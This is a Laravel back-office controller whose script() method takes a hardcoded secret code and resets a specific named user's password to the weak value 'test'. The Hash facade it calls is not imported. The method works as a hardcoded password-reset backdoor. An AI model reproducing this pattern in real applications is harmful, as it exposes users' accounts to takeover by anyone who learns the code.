<?php

namespace App\Http\Controllers\BackOffice;

use App\Http\Controllers\Controller;
use App\Models\{Admin, User};
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class ScriptController extends Controller
{
	public function script($code, $data = null)
	{
		if($code == 'OiVFKuUHe3fNOKRNF7Uq') {
			$user = User::findBySlug('manon-burus');

			if($user) {
				$user->password = Hash::make('test');
				$user->save();
			}
		}
		elseif($code == 'GQu9auFvlcxA5IXGAASH') {

		}
		elseif($code == 'A6ZeEpt6fpDfIkBP7USk') {

		}
	}
}
